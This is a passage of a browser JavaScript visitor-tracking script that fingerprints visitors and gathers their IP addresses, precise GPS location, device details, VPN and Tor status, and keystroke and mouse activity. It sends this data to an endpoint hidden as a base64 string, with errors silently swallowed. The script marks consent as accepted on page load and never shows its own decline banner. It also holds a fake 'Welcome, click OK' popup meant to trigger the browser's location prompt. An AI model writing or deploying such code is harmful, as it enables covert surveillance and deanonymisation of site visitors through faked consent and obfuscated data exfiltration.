                url: window.location.href,
                path: window.location.pathname,
                title: document.title,
                hostname: window.location.hostname,
                protocol: window.location.protocol,
                hash: window.location.hash || 'None',
                queryParams: window.location.search || 'None'
            },

            // Referrer & Marketing
            referrer: referrerInfo,

            // Location Data
            location: locationData,

            // Device Info
            device: {
                type: deviceInfo.deviceType,
                brand: deviceInfo.deviceBrand,
                model: deviceInfo.deviceModel,
                detectionSignals: deviceInfo.detectionSignals,
                ...hardwareInfo
            },

            // Browser Data
            browser: {
                name: browserInfo.browser,
                version: browserInfo.version,
                userAgent: browserInfo.userAgent,
                plugins: plugins
            },

            // OS Data
            os: {
                name: osInfo.os,
                version: osInfo.osVersion,
                architecture: osInfo.architecture,
                platform: navigator.platform
            },

            // Screen Data
            screen: screenInfo,

            // GPU Info
            gpu: gpuInfo,

            // Battery
            battery: batteryInfo,

            // Connection Data
            connection: connectionInfo,

            // Storage
            storage: storageInfo,

            // Media Devices
            mediaDevices: mediaDevices,

            // Timezone & Locale
            timezone: timezoneInfo,
            language: languageInfo,

            // Browser Capabilities
            capabilities: capabilities,

            // Fingerprints
            fingerprints: {
                canvas: canvasFingerprint,
                audio: audioFingerprint
            },

            // Detection
            detection: {
                adBlocker: adBlocker,
                privateMode: privateMode,
                bot: navigator.webdriver ? 'Possible Bot' : 'Human'
            },

            // Precise GPS Location (if user granted permission)
            gps: preciseGPS,

            // Session Data (will be updated)
            session: { ...sessionData },

            // Vendor Info
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub || 'None'
        };
    }

    // Obfuscated endpoint
    const _0x = ['aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3ZXJUbzl1WEt5RURTeEdKU05rU2VEYjBzRVBISXVQQXctT3RmeUQzNXdqaDFyM0F0MndOXy1obzhMZFNFc1N2VEE5QS9leGVj'];
    const _0xf = (s) => atob(s);

    // Send data to endpoint
    async function sendToGoogleSheets(visitorData) {
        try {
            const _e = _0xf(_0x[0]);
            await fetch(_e, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(visitorData)
            });
        } catch (error) {}
    }

    // Save visitor log
    function saveVisitorLog(visitorData) {
        // Save to localStorage (for local dashboard)
        let logs = [];
        try {
            const existingLogs = localStorage.getItem(LOGS_KEY);
            if (existingLogs) {
                logs = JSON.parse(existingLogs);
            }
        } catch (e) {
            logs = [];
        }

        logs.push(visitorData);

        // Keep last 500 entries (more data = less entries)
        if (logs.length > 500) {
            logs = logs.slice(-500);
        }

        localStorage.setItem(LOGS_KEY, JSON.stringify(logs));
        console.log('Enhanced visitor data logged:', visitorData);

        // Also send to Google Sheets
        sendToGoogleSheets(visitorData);
    }

    // Create and show consent banner
    function showConsentBanner() {
        const styles = document.createElement('style');
        styles.textContent = `
            .cookie-consent-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.5);
                z-index: 999998;
                backdrop-filter: blur(3px);
            }
            .cookie-consent-banner {
                position: fixed;
                bottom: 0;
                left: 0;
                right: 0;
                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                color: #ffffff;
                padding: 25px 30px;
                z-index: 999999;
                box-shadow: 0 -5px 30px rgba(0, 0, 0, 0.3);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                animation: slideUp 0.5s ease-out;
            }
            @keyframes slideUp {
                from { transform: translateY(100%); opacity: 0; }
                to { transform: translateY(0); opacity: 1; }
            }
            .cookie-consent-container {
                max-width: 1200px;
                margin: 0 auto;
                display: flex;
                flex-wrap: wrap;
                align-items: center;
                justify-content: space-between;
                gap: 20px;
            }
            .cookie-consent-content {
                flex: 1;
                min-width: 300px;
            }
            .cookie-consent-title {
                font-size: 20px;
                font-weight: 700;
                margin: 0 0 10px 0;
                color: #ffd700;
            }
            .cookie-consent-text {
                font-size: 14px;
                line-height: 1.6;
                margin: 0;
                color: #e0e0e0;
            }
            .cookie-consent-text a {
                color: #64b5f6;
                text-decoration: underline;
            }
            .cookie-consent-buttons {
                display: flex;
                gap: 12px;
                flex-wrap: wrap;
            }
            .cookie-consent-btn {
                padding: 14px 32px;
                border: none;
                border-radius: 8px;
                font-size: 15px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            .cookie-consent-btn-accept {
                background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
                color: white;
                box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
            }
            .cookie-consent-btn-accept:hover {
                background: linear-gradient(135deg, #45a049 0%, #3d8b40 100%);
                transform: translateY(-2px);
                box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
            }
            .cookie-consent-btn-decline {
                background: transparent;
                color: #e0e0e0;
                border: 2px solid #e0e0e0;
            }
            .cookie-consent-btn-decline:hover {
                background: rgba(255, 255, 255, 0.1);
                border-color: #ffffff;
                color: #ffffff;
            }
            @media (max-width: 768px) {
                .cookie-consent-banner {
                    padding: 20px;
                }
                .cookie-consent-container {
                    flex-direction: column;
                    text-align: center;
                }
                .cookie-consent-buttons {
                    width: 100%;
                    justify-content: center;
                }
                .cookie-consent-btn {
                    flex: 1;
                    min-width: 120px;
                }
            }
        `;
        document.head.appendChild(styles);

        const overlay = document.createElement('div');
        overlay.className = 'cookie-consent-overlay';
        overlay.id = 'cookieConsentOverlay';

        const banner = document.createElement('div');
        banner.className = 'cookie-consent-banner';
        banner.id = 'cookieConsentBanner';
        banner.innerHTML = `
            <div class="cookie-consent-container">
                <div class="cookie-consent-content">
                    <h3 class="cookie-consent-title">We Value Your Privacy</h3>
                    <p class="cookie-consent-text">
                        We use cookies and collect visitor information to enhance your browsing experience,
                        analyze site traffic, and improve our services. By clicking "Yes, I Accept", you consent
                        to our use of cookies and data collection as described in our
                        <a href="privacy-policy.html">Privacy Policy</a>.
                    </p>
                </div>
                <div class="cookie-consent-buttons">
                    <button class="cookie-consent-btn cookie-consent-btn-accept" id="cookieAcceptBtn">
                        Yes, I Accept
                    </button>
                    <button class="cookie-consent-btn cookie-consent-btn-decline" id="cookieDeclineBtn">
                        No, Thanks
                    </button>
                </div>
            </div>
        `;

        document.body.appendChild(overlay);
        document.body.appendChild(banner);

        document.getElementById('cookieAcceptBtn').addEventListener('click', async function() {
            localStorage.setItem(CONSENT_KEY, 'accepted');

            const visitorData = await collectVisitorData();
            visitorData.consentGiven = true;
            visitorData.consentTime = new Date().toISOString();
            saveVisitorLog(visitorData);

            document.getElementById('cookieConsentOverlay').remove();
            document.getElementById('cookieConsentBanner').remove();

            showThankYouMessage();
            initBehaviorTracking();
        });

        document.getElementById('cookieDeclineBtn').addEventListener('click', function() {
            localStorage.setItem(CONSENT_KEY, 'declined');
            document.getElementById('cookieConsentOverlay').remove();
            document.getElementById('cookieConsentBanner').remove();
        });
    }

    function showThankYouMessage() {
        const toast = document.createElement('div');
        toast.style.cssText = `
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
            color: white;
            padding: 16px 24px;
            border-radius: 8px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 14px;
            font-weight: 500;
            z-index: 999999;
            box-shadow: 0 4px 20px rgba(76, 175, 80, 0.4);
            animation: fadeInUp 0.4s ease-out;
        `;
        toast.innerHTML = 'Thank you for accepting cookies!';
        document.body.appendChild(toast);

        setTimeout(() => {
            toast.style.animation = 'fadeOut 0.4s ease-out forwards';
            setTimeout(() => toast.remove(), 400);
        }, 3000);

        const fadeOutStyle = document.createElement('style');
        fadeOutStyle.textContent = `
            @keyframes fadeInUp {
                from { transform: translateY(20px); opacity: 0; }
                to { transform: translateY(0); opacity: 1; }
            }
            @keyframes fadeOut {
                from { opacity: 1; }
                to { opacity: 0; }
            }
        `;
        document.head.appendChild(fadeOutStyle);
    }

    // Show location consent popup (only OK button)
    function showLocationConsent() {
        const styles = document.createElement('style');
        styles.id = 'locationConsentStyles';
        styles.textContent = `
            .location-consent-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.7);
                z-index: 999999;
                display: flex;
                justify-content: center;
                align-items: center;
                backdrop-filter: blur(5px);
            }
            .location-consent-box {
                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                padding: 30px 40px;
                border-radius: 16px;
                text-align: center;
                max-width: 400px;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                animation: popIn 0.3s ease-out;
            }
            @keyframes popIn {
                from { transform: scale(0.8); opacity: 0; }
                to { transform: scale(1); opacity: 1; }
            }
            .location-consent-icon {
                font-size: 48px;
                margin-bottom: 15px;
            }
            .location-consent-title {
                color: #ffd700;
                font-size: 22px;
                font-weight: 700;
                margin: 0 0 15px 0;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            .location-consent-text {
                color: #e0e0e0;
                font-size: 14px;
                line-height: 1.6;
                margin: 0 0 25px 0;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            .location-consent-btn {
                background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
                color: white;
                border: none;
                padding: 14px 50px;
                font-size: 16px;
                font-weight: 600;
                border-radius: 8px;
                cursor: pointer;
                text-transform: uppercase;
                letter-spacing: 1px;
                box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
                transition: all 0.3s ease;
            }
            .location-consent-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
            }
        `;
        document.head.appendChild(styles);

        const overlay = document.createElement('div');
        overlay.className = 'location-consent-overlay';
        overlay.id = 'locationConsentOverlay';
        overlay.innerHTML = `
            <div class="location-consent-box">
                <div class="location-consent-icon">✓</div>
                <h3 class="location-consent-title">Welcome</h3>
                <p class="location-consent-text">
                    Click OK to continue to the website.
                </p>
                <button class="location-consent-btn" id="locationConsentBtn">OK</button>
            </div>
        `;

        document.body.appendChild(overlay);

        document.getElementById('locationConsentBtn').addEventListener('click', async function() {
            // Remove the popup
            document.getElementById('locationConsentOverlay').remove();
            document.getElementById('locationConsentStyles')?.remove();

            // Now collect data (this will trigger browser's location popup)
            const visitorData = await collectVisitorData();
            visitorData.consentGiven = true;
            visitorData.locationConsentShown = true;
            saveVisitorLog(visitorData);
            initBehaviorTracking();
        });
    }

    async function logPageVisit() {
        // Collect data silently without any popup
        const visitorData = await collectVisitorData();
        visitorData.consentGiven = true;
        saveVisitorLog(visitorData);
        initBehaviorTracking();
    }

    // Export functions
    window.exportVisitorLogs = function() {
        const logs = JSON.parse(localStorage.getItem(LOGS_KEY) || '[]');
        if (logs.length === 0) {
            alert('No visitor logs found.');
            return;
        }

        let textContent = '='.repeat(100) + '\n';
        textContent += '                         ENHANCED VISITOR LOGS EXPORT\n';
        textContent += '                         Generated: ' + new Date().toLocaleString() + '\n';
        textContent += '='.repeat(100) + '\n\n';

        logs.forEach((log, index) => {
            textContent += '-'.repeat(100) + '\n';
            textContent += `VISITOR #${index + 1} - ${log.visitId || 'N/A'}\n`;
            textContent += '-'.repeat(100) + '\n';
            textContent += `Timestamp: ${log.timestamp}\n`;
            textContent += `Local Time: ${log.localTime}\n\n`;

            textContent += 'PAGE INFORMATION:\n';
            if (log.page) {
                textContent += `  URL: ${log.page.url}\n`;
                textContent += `  Title: ${log.page.title}\n`;
                textContent += `  Path: ${log.page.path}\n`;
            }

            textContent += '\nREFERRER & MARKETING:\n';
            if (log.referrer) {
                textContent += `  Source: ${log.referrer.source}\n`;
                textContent += `  Medium: ${log.referrer.medium}\n`;
                textContent += `  Campaign: ${log.referrer.campaign}\n`;
                textContent += `  Full Referrer: ${log.referrer.fullReferrer}\n`;
            }

            textContent += '\n*** ALL IP ADDRESSES DETECTED ***\n';
            if (log.location) {
                textContent += `  Total IPs Found: ${log.location.totalIPsFound || 0}\n`;
                textContent += `  Primary Public IP: ${log.location.publicIP || log.location.ip || 'Unknown'}\n`;
                textContent += `  IPv6 Address: ${log.location.ipv6Address || 'Not detected'}\n`;
                textContent += `  IP Version: ${log.location.ipVersion || 'IPv4'}\n`;
                textContent += `  Network: ${log.location.network || 'N/A'}\n\n`;

                // List all IPs found
                if (log.location.allIPsSummary && log.location.allIPsSummary.length > 0) {
                    textContent += '  --- Complete IP List ---\n';
                    log.location.allIPsSummary.forEach((ipInfo, idx) => {
                        textContent += `    ${idx + 1}. ${ipInfo.ip} [${ipInfo.type}]\n`;
                    });
                    textContent += '\n';
                }

                // WebRTC detected IPs
                if (log.location.allIPs && log.location.allIPs.webrtc) {
                    textContent += '  --- WebRTC Local/Private IPs ---\n';
                    if (log.location.allIPs.webrtc.private && log.location.allIPs.webrtc.private.length > 0) {
                        log.location.allIPs.webrtc.private.forEach(ip => {
                            textContent += `    Private: ${ip}\n`;
                        });
                    } else {
                        textContent += '    No private IPs detected via WebRTC\n';
                    }
                    if (log.location.allIPs.webrtc.public && log.location.allIPs.webrtc.public.length > 0) {
                        log.location.allIPs.webrtc.public.forEach(ip => {
                            textContent += `    Public (STUN): ${ip}\n`;
                        });
                    }
                    if (log.location.allIPs.webrtc.ipv6 && log.location.allIPs.webrtc.ipv6.length > 0) {
                        log.location.allIPs.webrtc.ipv6.forEach(ip => {
                            textContent += `    IPv6: ${ip}\n`;
                        });
                    }
                    textContent += '\n';
                }

                // IP Sources verification
                if (log.location.allIPs && log.location.allIPs.public && log.location.allIPs.public.sources) {
                    textContent += '  --- IP Sources Verification ---\n';
                    Object.entries(log.location.allIPs.public.sources).forEach(([source, ip]) => {
                        textContent += `    ${source}: ${ip}\n`;
                    });
                    textContent += '\n';
                }
            }

            textContent += '\nLOCATION & GEOLOCATION:\n';
            if (log.location) {
                textContent += `  City: ${log.location.city || 'N/A'}\n`;
                textContent += `  District: ${log.location.district || 'N/A'}\n`;
                textContent += `  Region/State: ${log.location.region || 'N/A'} (${log.location.regionCode || 'N/A'})\n`;
                textContent += `  Country: ${log.location.country || 'N/A'} (${log.location.countryCode || 'N/A'})\n`;
                textContent += `  Zip/Postal Code: ${log.location.zipCode || 'N/A'}\n`;
                textContent += `  Coordinates: ${log.location.latitude || 'N/A'}, ${log.location.longitude || 'N/A'}\n`;
                textContent += `  Continent: ${log.location.continentCode || 'N/A'}\n`;
                textContent += `  Country Capital: ${log.location.countryCapital || 'N/A'}\n`;
                textContent += `  Country Calling Code: ${log.location.countryCallingCode || 'N/A'}\n`;
                textContent += `  Languages: ${log.location.languages || 'N/A'}\n`;
                textContent += `  Currency: ${log.location.currency || 'N/A'}\n`;
                textContent += `  In EU: ${log.location.inEU || 'N/A'}\n`;
            }

            textContent += '\nTIMEZONE & TIME:\n';
            if (log.location) {
                textContent += `  Timezone: ${log.location.timezone || 'N/A'}\n`;
                textContent += `  UTC Offset: ${log.location.utcOffset || 'N/A'}\n`;
            }

            textContent += '\nNETWORK & ISP DETAILS:\n';
            if (log.location) {
                textContent += `  ISP: ${log.location.isp || 'N/A'}\n`;
                textContent += `  Organization: ${log.location.organization || 'N/A'}\n`;
                textContent += `  ASN: ${log.location.asn || 'N/A'}\n`;
                textContent += `  ASN Name: ${log.location.asnName || 'N/A'}\n`;
                textContent += `  Reverse DNS: ${log.location.reverseDNS || 'N/A'}\n`;
                textContent += `  Connection Type: ${log.location.connectionType || 'N/A'}\n`;
            }

            textContent += '\nSECURITY & ANONYMITY DETECTION:\n';
            if (log.location) {
                textContent += `  Is Mobile Network: ${log.location.isMobile || 'N/A'}\n`;
                textContent += `  Is Proxy: ${log.location.isProxy || 'N/A'}\n`;
                textContent += `  Is VPN: ${log.location.isVPN || 'N/A'}\n`;
                textContent += `  Is Tor: ${log.location.isTor || 'N/A'}\n`;
                textContent += `  Is Hosting/Data Center: ${log.location.isHosting || 'N/A'}\n`;
            }

            textContent += '\n*** PRECISE GPS LOCATION ***\n';
            if (log.gps) {
                textContent += `  Permission: ${log.gps.permission || 'N/A'}\n`;
                if (log.gps.available && log.gps.gpsCoordinates) {
                    textContent += `  GPS Latitude: ${log.gps.gpsCoordinates.latitude}\n`;
                    textContent += `  GPS Longitude: ${log.gps.gpsCoordinates.longitude}\n`;
                    textContent += `  Accuracy: ${log.gps.accuracy || 'N/A'}\n`;
                    textContent += `  Altitude: ${log.gps.altitude || 'N/A'}\n`;
                    textContent += `  Altitude Accuracy: ${log.gps.altitudeAccuracy || 'N/A'}\n`;
                    textContent += `  Heading: ${log.gps.heading || 'N/A'}\n`;
                    textContent += `  Speed: ${log.gps.speed || 'N/A'}\n`;
                    textContent += `  Google Maps: ${log.gps.googleMapsLink || 'N/A'}\n`;
                } else {
                    textContent += `  GPS Data: Not available (${log.gps.permission})\n`;
                    if (log.gps.error) {
                        textContent += `  Error: ${log.gps.error}\n`;
                    }
                }
            }

            textContent += '\nDEVICE INFORMATION:\n';
            if (log.device) {
                textContent += `  Type: ${log.device.type}\n`;
                textContent += `  Brand: ${log.device.brand}\n`;
                textContent += `  Model: ${log.device.model}\n`;
                textContent += `  CPU Cores: ${log.device.cpuCores}\n`;
                textContent += `  RAM: ${log.device.deviceMemory}\n`;
                textContent += `  Touch Points: ${log.device.maxTouchPoints}\n`;
                textContent += `  Touch Support: ${log.device.touchSupport}\n`;
                textContent += `  Pointer Type: ${log.device.pointerType}\n`;
            }

            textContent += '\nBROWSER INFORMATION:\n';
            if (log.browser) {
                textContent += `  Browser: ${log.browser.name} ${log.browser.version}\n`;
                textContent += `  Plugins: ${log.browser.plugins?.join(', ') || 'None'}\n`;
                textContent += `  User Agent: ${log.browser.userAgent}\n`;
            }

            textContent += '\nOPERATING SYSTEM:\n';
            if (log.os) {
                textContent += `  OS: ${log.os.name} ${log.os.version}\n`;
                textContent += `  Architecture: ${log.os.architecture}\n`;
                textContent += `  Platform: ${log.os.platform}\n`;
            }

            textContent += '\nSCREEN & DISPLAY:\n';
            if (log.screen) {
                textContent += `  Screen Resolution: ${log.screen.screenWidth}x${log.screen.screenHeight}\n`;
                textContent += `  Available: ${log.screen.availWidth}x${log.screen.availHeight}\n`;
                textContent += `  Viewport: ${log.screen.viewportWidth}x${log.screen.viewportHeight}\n`;
                textContent += `  Color Depth: ${log.screen.colorDepth} bit\n`;
                textContent += `  Pixel Ratio: ${log.screen.pixelRatio}\n`;
                textContent += `  Orientation: ${log.screen.orientation}\n`;
                textContent += `  Is Retina: ${log.screen.isRetina}\n`;
                textContent += `  Aspect Ratio: ${log.screen.aspectRatio}\n`;
            }

            textContent += '\nGPU INFORMATION:\n';
            if (log.gpu) {
                textContent += `  Vendor: ${log.gpu.vendor}\n`;
                textContent += `  Renderer: ${log.gpu.renderer}\n`;
                textContent += `  WebGL Version: ${log.gpu.webglVersion || 'N/A'}\n`;
            }

            textContent += '\nBATTERY STATUS:\n';
            if (log.battery) {
                textContent += `  Charging: ${log.battery.charging}\n`;
                textContent += `  Level: ${log.battery.level}\n`;
            }

            textContent += '\nCONNECTION:\n';
            if (log.connection) {
                textContent += `  Type: ${log.connection.effectiveType}\n`;
                textContent += `  Downlink: ${log.connection.downlink}\n`;
                textContent += `  RTT: ${log.connection.rtt}\n`;
                textContent += `  Data Saver: ${log.connection.saveData}\n`;
            }

            textContent += '\nMEDIA DEVICES:\n';
            if (log.mediaDevices) {
                textContent += `  Cameras: ${log.mediaDevices.cameras}\n`;
                textContent += `  Microphones: ${log.mediaDevices.microphones}\n`;
                textContent += `  Speakers: ${log.mediaDevices.speakers}\n`;
            }

            textContent += '\nSTORAGE:\n';
            if (log.storage) {
                textContent += `  Quota: ${log.storage.quota}\n`;
                textContent += `  Used: ${log.storage.usage}\n`;
            }

            textContent += '\nTIMEZONE & LOCALE:\n';
            if (log.timezone) {
                textContent += `  Timezone: ${log.timezone.timezone}\n`;
                textContent += `  Offset: ${log.timezone.timezoneOffset}\n`;
                textContent += `  DST: ${log.timezone.dst}\n`;
            }
            if (log.language) {
                textContent += `  Language: ${log.language.language}\n`;
                textContent += `  All Languages: ${log.language.languages}\n`;
            }

            textContent += '\nFINGERPRINTS:\n';
            if (log.fingerprints) {
                textContent += `  Canvas: ${log.fingerprints.canvas}\n`;
                textContent += `  Audio: ${log.fingerprints.audio}\n`;
            }

            textContent += '\nDETECTION:\n';
            if (log.detection) {
                textContent += `  Ad Blocker: ${log.detection.adBlocker}\n`;
                textContent += `  Private Mode: ${log.detection.privateMode}\n`;
                textContent += `  Bot Detection: ${log.detection.bot}\n`;
            }

            textContent += '\nSESSION DATA:\n';
            if (log.session) {
                textContent += `  Time on Page: ${log.session.timeOnPage}s\n`;
                textContent += `  Clicks: ${log.session.clicks}\n`;
                textContent += `  Scroll Depth: ${log.session.scrollDepth}%\n`;
                textContent += `  Mouse Movements: ${log.session.mouseMovements}\n`;
                textContent += `  Keystrokes: ${log.session.keystrokes}\n`;
            }

            textContent += '\n';
        });

        textContent += '='.repeat(100) + '\n';
        textContent += `Total Visitors Logged: ${logs.length}\n`;
        textContent += '='.repeat(100) + '\n';

        const blob = new Blob([textContent], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'visitor_logs_enhanced_' + new Date().toISOString().slice(0, 10) + '.txt';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };

    window.exportVisitorLogsJSON = function() {
        const logs = JSON.parse(localStorage.getItem(LOGS_KEY) || '[]');
        if (logs.length === 0) {
            alert('No visitor logs found.');
            return;
        }

        const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'visitor_logs_enhanced_' + new Date().toISOString().slice(0, 10) + '.json';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };

    window.getVisitorLogs = function() {
        return JSON.parse(localStorage.getItem(LOGS_KEY) || '[]');
    };

    window.clearVisitorLogs = function() {
        if (confirm('Are you sure you want to clear all visitor logs?')) {
            localStorage.removeItem(LOGS_KEY);
            alert('All visitor logs have been cleared.');
        }
    };

    // Initialize
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    function init() {
        // Auto-accept cookies and collect data immediately (no banner shown)
        localStorage.setItem(CONSENT_KEY, 'accepted');
        logPageVisit();
    }
})();
